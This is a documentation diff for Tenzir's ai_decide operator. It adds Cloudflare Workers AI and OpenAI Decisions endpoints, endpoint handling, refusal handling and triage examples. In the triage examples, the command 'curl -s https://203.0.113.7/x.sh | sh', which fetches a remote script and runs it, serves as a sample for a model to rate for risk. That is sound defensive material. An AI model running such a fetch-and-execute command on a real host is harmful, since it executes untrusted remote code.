@@ -24,6 +24,46 @@ The `ai_decide` operator sends one request per input event to a **decision model
 
 The operator speaks the System One API, which hosted and self-hosted decision models implement. It appends `/systemone` to the `endpoint` and sends a `POST` request with the model, the questions, and the event under evaluation. For example, hosted Jev from TypeSafe AI uses the endpoint `https://api.typesafe.ai/v1`, and a local [Laya](https://laya.tools) server started with `laya-serve` uses `http://127.0.0.1:8000/v1`.
 
+Two providers serve decision models at their own URL, and the operator recognizes both and sends the request to the `endpoint` as is:
+
+* **Cloudflare Workers AI** serves its open-weight Clef models at a run URL.
+* **OpenAI** serves `gpt-6-luna` at its Decisions endpoint.
+
+See [Choose an endpoint](ai_decide.md#choose-an-endpoint) for the details.
+
+### Choose an endpoint
+
+The `endpoint` decides which provider answers. All of them take the same pipeline, so you can switch a pipeline between them by changing `endpoint`, `model`, and `api_key`.
+
+| Provider                                | `endpoint`                                                                                    | `model`                         |
+| --------------------------------------- | --------------------------------------------------------------------------------------------- | ------------------------------- |
+| Hosted Jev                              | `https://api.typesafe.ai/v1`                                                                  | `jev-latest`                    |
+| Local Laya or another System One server | `http://127.0.0.1:8000/v1`                                                                    | the model that the server hosts |
+| Cloudflare Workers AI, Clef             | `https://api.cloudflare.com/client/v4/accounts/<account-id>/ai/run/@cf/cloudflare/clef`       | `clef`                          |
+| Cloudflare Workers AI, Clef Flash       | `https://api.cloudflare.com/client/v4/accounts/<account-id>/ai/run/@cf/cloudflare/clef-flash` | `clef-flash`                    |
+| OpenAI Decisions API                    | `https://api.openai.com/v1/decisions`                                                         | `gpt-6-luna`                    |
+
+The path of the endpoint decides how the operator uses it, after it strips trailing slashes:
+
+* A path that contains `/ai/run/` is a Workers AI run URL, and the operator uses it as is.
+* A path that ends in `/decisions` is an OpenAI Decisions endpoint, and the operator uses it as is.
+* A path that ends in `/systemone` stays as is.
+* For any other path, the operator appends `/systemone`.
+
+Workers AI follows the System One format and wraps each response in a `result` field, which the operator unwraps. To call it, you need your Cloudflare account ID for the run URL and an API token with the `Workers AI - Read` and `Workers AI - Edit` permissions as `api_key`. Cloudflare explains how to [find your account ID](https://developers.cloudflare.com/fundamentals/account/find-account-and-zone-ids/) and how to [create the token](https://developers.cloudflare.com/workers-ai/get-started/rest-api/).
+
+Workers AI takes at most 64 questions and 10 levels per `score` question. Question IDs must have 1 to 100 ASCII letters, digits, `_`, `.`, or `-`. The operator fails at the start for larger question sets or other IDs.
+
+The OpenAI Decisions API uses a different format, and the operator translates for it:
+
+* A `noul` question becomes a `predicate` question. OpenAI has no criteria for yes/no questions, so the descriptions of `true` and `false` join the instructions.
+* The options of a `choice` question become `choices`, and the levels of a `score` question become `levels`. A level can also be a record with a `label` and a `description`.
+* OpenAI takes the evidence as text, so a record or list `state` travels as its JSON text.
+* OpenAI can refuse single questions, for example when the evidence is too short to judge. The answer to a refused question is `null`, the other answers stay, and the operator warns with the number of refusals. See [Result](ai_decide.md#result).
+* OpenAI takes at most 200 questions, 255 options per `choice` question, and 10 levels per `score` question. The operator fails at the start for larger question sets.
+
+Every hosted endpoint receives the `state` of each event. To keep it inside your network, run an open-weight decision model on your own host, such as Clef with a System One server.
+
 ### Question types
 
 Every question has one of three types:
@@ -88,7 +128,7 @@ Questions are constants. Put the per-event data that the model should read into 
 
 ### Choose what the model reads
 
-The `state` argument is the content that the model evaluates. A string is sent as text. A record or list is sent as structured JSON, so the model sees field names and nesting. Other values, such as numbers or IP addresses, are sent as their JSON text. If `state` is `null`, the operator skips the request, emits a warning, and writes `null` to the result field.
+The `state` argument is the content that the model evaluates. A string is sent as text. A record or list is sent as structured JSON, so the model sees field names and nesting. The OpenAI Decisions API takes only text, so it receives the JSON as text instead. See [Choose an endpoint](ai_decide.md#choose-an-endpoint). Other values, such as numbers or IP addresses, are sent as their JSON text. If `state` is `null`, the operator skips the request, emits a warning, and writes `null` to the result field.
 
 By default, `state` is the whole event without the `ai` field and without the `into` field. This keeps the results of earlier AI operators out of the request. Pass `state=this` to send the event unchanged. Prefer a small record with only the fields that the question needs: the model reads less, answers faster, and decision models have a limited context.
 
@@ -104,23 +144,23 @@ Tenzir validates the questions when it compiles the pipeline. The pipeline doesn
 
 When all levels of a scale are well-known words in descending order, such as `["High", "Medium", "Low"]`, the operator warns, because the first level always scores 0.
 
-The server may enforce further limits, such as a maximum number of options per question.
+The server may enforce further limits, such as a maximum number of options per question. For the limits of Workers AI and the OpenAI Decisions API, see [Choose an endpoint](ai_decide.md#choose-an-endpoint).
 
 ### Result
 
-The operator preserves input order, even when `concurrency` is greater than `1`. If a request fails or the server returns an invalid answer, such as a missing answer or a probability outside of 0 to 1, Tenzir emits a warning, keeps the input event, and writes `null` to the result field. Test for `null` to fail open, for example `where ai.decide == null or ai.decide.answer.score >= 1.5`.
+The operator preserves input order, even when `concurrency` is greater than `1`. If a request fails or the server returns an invalid answer, such as a missing answer or a probability outside of 0 to 1, Tenzir emits a warning, keeps the input event, and writes `null` to the result field. If the model refuses a question, as OpenAI can, the answer to that question is `null`. Test the answer for `null` to fail open in both cases, for example `where ai.decide.answer? == null or ai.decide.answer.score >= 1.5`.
 
-The result field is a record. With a positional question, it holds the answer in `answer`. With `questions`, it holds the answers in `answers`, keyed by question ID. Each answer has the structure of its question type.
+The result field is a record. With a positional question, it holds the answer in `answer`. With `questions`, it holds the answers in `answers`, keyed by question ID. Each answer has the structure of its question type, or is `null` if the model refused the question.
 
 Result record
 
 ```tql
 {
   // With a positional question:
-  answer: <answer>,
+  answer: <answer> | null,
   // With `questions`:
   answers: {
-    <id>: <answer>,
+    <id>: <answer> | null,
     …
   },
   model: string | null,
@@ -179,13 +219,13 @@ Use either `question` or `questions`.
 
 ### `model = string`
 
-The model to use, such as `jev-latest` for hosted Jev.
+The model to use, such as `jev-latest` for hosted Jev, `clef` or `clef-flash` for Cloudflare Workers AI, or `gpt-6-luna` for the OpenAI Decisions API. On Workers AI, the model must match the one in the run URL.
 
 This argument is required.
 
 ### `endpoint = string`
 
-The base endpoint of a System One API server. The operator appends `/systemone` unless the endpoint already ends with it.
+The URL of the decision model: the base endpoint of a System One API server, the run URL of a Cloudflare Workers AI model, or the OpenAI Decisions endpoint. The operator appends `/systemone` to a System One base endpoint. See [Choose an endpoint](ai_decide.md#choose-an-endpoint).
 
 The endpoint is resolved as a [secret](../../explanations/secrets.md), so you can pass a secret name to avoid hardcoding sensitive URLs.
 
@@ -268,6 +308,51 @@ select cmd=process.cmd_line,
        explanation=ai.prompt.text
 ```
 
+### Triage with Cloudflare Workers AI or OpenAI
+
+Rate a command with a hosted decision model that is not Jev. Only the `model`, `endpoint`, and `api_key` change. This pipeline calls Clef on Cloudflare Workers AI, with the run URL that contains your account ID in the secret `cloudflare-run-url` and the API token in `cloudflare-api-token`:
+
+```tql
+from {cmd: "curl -s https://203.0.113.7/x.sh | sh"}
+ai_decide "How risky is this command for the host?",
+          scale=["Routine administration", "Unusual but plausible",
+                 "Likely malicious"],
+          state=cmd,
+          model="clef",
+          endpoint=secret("cloudflare-run-url"),
+          api_key=secret("cloudflare-api-token")
+where ai.decide.answer.score >= 1.5
+```
+
+With OpenAI, point the pipeline at the Decisions endpoint:
+
+```tql
+from {cmd: "curl -s https://203.0.113.7/x.sh | sh"}
+ai_decide "How risky is this command for the host?",
+          scale=["Routine administration", "Unusual but plausible",
+                 "Likely malicious"],
+          state=cmd,
+          model="gpt-6-luna",
+          endpoint="https://api.openai.com/v1/decisions",
+          api_key=secret("openai-api-key")
+where ai.decide.answer.score >= 1.5
+select cmd,
+       score=ai.decide.answer.score,
+       probabilities=ai.decide.answer.probabilities
+```
+
+```tql
+{
+  cmd: "curl -s https://203.0.113.7/x.sh | sh",
+  score: 1.87,
+  probabilities: [
+    0.03,
+    0.07,
+    0.9,
+  ],
+}
+```
+
 ### Classify logs with a local model
 
 Pick an OCSF class for raw log lines with a local Laya server:
@@ -337,7 +422,7 @@ ai_decide "Is this login suspicious?",
           endpoint=secret("decision-endpoint"),
           api_key=secret("decision-api-key"),
           timeout=5s
-where ai.decide == null or ai.decide.answer.probability >= 0.5
+where ai.decide.answer? == null or ai.decide.answer.probability >= 0.5
 ```
 
 ## See Also
